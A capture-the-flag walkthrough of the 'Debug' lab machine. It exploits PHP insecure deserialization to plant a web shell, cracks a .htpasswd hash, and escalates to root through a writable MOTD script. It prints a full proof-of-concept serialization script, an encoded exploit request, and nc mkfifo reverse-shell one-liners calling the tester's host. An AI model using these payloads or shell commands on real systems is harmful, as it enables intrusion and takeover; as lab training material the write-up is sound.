# Debug

![A full scheme to get user and root.](<../../.gitbook/assets/image (4).png>)

## Enumeration

### port scan

```
nmap -sV 10.10.145.15 -T4 -Pn -n -p22,80 -oA services
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 15:35 EDT
Nmap scan report for 10.10.145.15
Host is up (0.074s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
```

### http

Scanning with feroxbuster and dirb/big.txt wordlist:

```bash
feroxbuster -u http://10.10.145.15/ -w /usr/share/wordlists/dirb/big.txt -x txt,zip,php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.6.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.145.15/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [txt, zip, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://10.10.145.15/
301      GET        9l       28w      313c http://10.10.145.15/backup => http://10.10.145.15/backup/
301      GET        9l       28w      311c http://10.10.145.15/grid => http://10.10.145.15/grid/
200      GET      204l      469w     5732c http://10.10.145.15/index.php
301      GET        9l       28w      317c http://10.10.145.15/javascript => http://10.10.145.15/javascript/
301      GET        9l       28w      318c http://10.10.145.15/javascripts => http://10.10.145.15/javascripts/
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htpasswd
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htaccess
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htpasswd.txt
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htaccess.txt
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htpasswd.zip
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htaccess.zip
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htaccess.php
403      GET        9l       28w      277c http://10.10.145.15/javascript/.htpasswd.php
403      GET        9l       28w      277c http://10.10.145.15/.php
200      GET        2l       20w       94c http://10.10.145.15/message.txt
403      GET        9l       28w      277c http://10.10.145.15/server-status
301      GET        9l       28w      324c http://10.10.145.15/javascript/jquery => http://10.10.145.15/javascript/jquery/
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htaccess
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htpasswd
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htaccess.txt
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htpasswd.txt
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htpasswd.zip
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htaccess.zip
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htaccess.php
403      GET        9l       28w      277c http://10.10.145.15/javascript/jquery/.htpasswd.php
403      GET        9l       28w      277c http://10.10.145.15/javascript/.php
200      GET    10351l    43235w   284394c http://10.10.145.15/javascript/jquery/jquery
[####################] - 12m   491256/491256  0s      found:28      errors:139    
[####################] - 5m     81876/81876   238/s   http://10.10.145.15/ 
[####################] - 0s     81876/81876   0/s     http://10.10.145.15/backup => Directory listing (add -e to scan)
[####################] - 0s     81876/81876   0/s     http://10.10.145.15/grid => Directory listing (add -e to scan)
[####################] - 8m     81876/81876   165/s   http://10.10.145.15/javascript 
[####################] - 0s     81876/81876   0/s     http://10.10.145.15/javascripts => Directory listing (add -e to scan)
[####################] - 6m     81876/81876   211/s   http://10.10.145.15/javascript/jquery
```

It found interesting dir `/backup`. Actually, this directory with backup of the entire web-app, which is `Sensitive Information Disclosure` vulnerability. But this is not the end. We can see the source code of `index.php`. For this challenge, it's intended to analyze php code.

## Gaining access

Let's continue with `index.php`. It contains a simple html with one form and a php code with class that has `__destruct()` method. You can see below:

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


```

Also, it contains a call of `unserialize` function which leads to `Insecure Deserialization`.

Why? The class has a method `__destruct()` which will destroy an object after completion of code execution inside `<?php ?>`. Thus, it is possible to perform insecure deserialization attack and gain access. How? Well, we just take initial file, delete html and create a new object of this class with our data. My final file poc.php that I launched with command `php poc.php`:

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$debug_obj = new FormSubmit;
$debug_obj->form_file = 'revshell.php';
$debug_obj->message = "<?php system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 443 >/tmp/f'); ?>";
$serialized_debug_obj = serialize($debug_obj);
echo $serialized_debug_obj . "\n";

?>
```

Here, you can notice that I modified two fields of initial object `FormSubmit`. This fields are crucial. In `__destruct()` method we put a content of the field `message` to the file with filename `form_file`. That's it. So, the first field `form_file` modified to create a new php file, and the second field `message` modified with content of our payload to execute reverse shell command.

```bash
php poc.php    
O:10:"FormSubmit":2:{s:9:"form_file";s:13:"revshell.php";s:7:"message";s:101:"<?php system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 443 >/tmp/f'); ?>";}
Your submission has been successfully saved!Your submission has been successfully saved!
```

Now, we perform a GET request to our vulnerable app:

```
GET /index.php?name=rce&email=rce&comments=rce&select=1&radio=1&checkbox=1&debug=O%3a10%3a"FormSubmit"%3a2%3a{s%3a9%3a"form_file"%3bs%3a13%3a"revshell.php"%3bs%3a7%3a"message"%3bs%3a101%3a"<%3fphp+system('rm+-f+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.11.61.18+443+>/tmp/f')%3b+%3f>"%3b} HTTP/1.1
Host: 10.10.145.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.145.15/index.php
Upgrade-Insecure-Requests: 1


```

After that, we can run reverse shell with `GET /revshell.php HTTP/1.1` request. Don't forget to get interactive shell after:

```bash
# nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.61.18] from (UNKNOWN) [10.10.145.15] 56486
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -la
total 84
drwxr-xr-x 6 www-data www-data  4096 Apr 19 15:28 .
drwxr-xr-x 3 root     root      4096 Mar  9  2021 ..
-rw-r--r-- 1 www-data www-data    44 Mar  9  2021 .htpasswd
drwxr-xr-x 5 www-data www-data  4096 Mar  9  2021 backup
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 grid
-rw-r--r-- 1 www-data www-data 11321 Mar  9  2021 index.html
-rw-r--r-- 1 www-data www-data  6399 Mar  9  2021 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 javascripts
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
-rw-r--r-- 1 www-data www-data    82 Apr 19 15:23 message.php
-rw-r--r-- 1 www-data www-data   830 Apr 19 15:28 message.txt
-rw-r--r-- 1 www-data www-data    74 Apr 19 15:25 rce.php
-rw-r--r-- 1 www-data www-data  2339 Mar  9  2021 readme.md
-rw-r--r-- 1 www-data www-data    76 Apr 19 15:26 revshell.php
-rw-r--r-- 1 www-data www-data   101 Apr 19 15:28 revshell2.php
-rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@osboxes:/var/www/html$ export TERM=screen
export TERM=screen
www-data@osboxes:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 443
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# stty raw -echo;fg                             
[1]  + continued  nc -lnvp 443

www-data@osboxes:/var/www/html$
```

## Privilege escalation

`/var/www/html` directory contains file `.htpasswd` with a hash:

```bash
www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

Crack it with JTR:

```
john -w=/usr/share/wordlists/rockyou.txt hash                    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 XOP 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamaica          (james)     
1g 0:00:00:00 DONE (2022-04-19 15:58) 11.11g/s 7111p/s 7111c/s 7111C/s hockey..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nice, we got a user.

Message from root inside james home directory:

```
james@osboxes:~$ cat Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

Okay, james has to have access to ssh motd. And we check it with:

```bash
james@osboxes:~$ cd /etc/update-motd.d/
james@osboxes:/etc/update-motd.d$ ls -la
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-es
```

Yeah, he has it. Thus, privesc is easy. Just inject bash reverse shell in 00-header:

```bash
james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 4443 >/tmp/f
```

After modification, we need to trigger motd, so, relogin via ssh and get a shell as root:

```bash
nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.11.61.18] from (UNKNOWN) [10.10.145.15] 43194
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```
